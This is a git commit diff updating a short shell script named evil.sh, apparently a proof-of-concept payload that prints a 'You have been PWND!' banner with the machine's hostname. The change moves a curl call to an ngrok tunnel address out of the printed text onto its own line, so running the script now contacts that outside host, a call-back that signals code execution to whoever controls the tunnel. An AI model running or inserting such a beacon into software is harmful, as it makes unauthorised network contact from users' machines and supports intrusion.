91fe367c3715447b2a06ab40d9a49bcd91eaf8c3
russenmandev <jamsewiler@gmail.com>
2018-06-06 12:42:30 +0400

    Update evil.sh

--- evil.sh
+++ evil.sh
@@ -1,6 +1,8 @@
 #!/bin/sh
 cat << EOF
 ****************
-You have been PWND! Here is your hostname: $(hostname); curl b1813018.ngrok.io;
+You have been PWND! Here is your hostname: $(hostname);
 ****************
 EOF
+
+curl b1813018.ngrok.io;
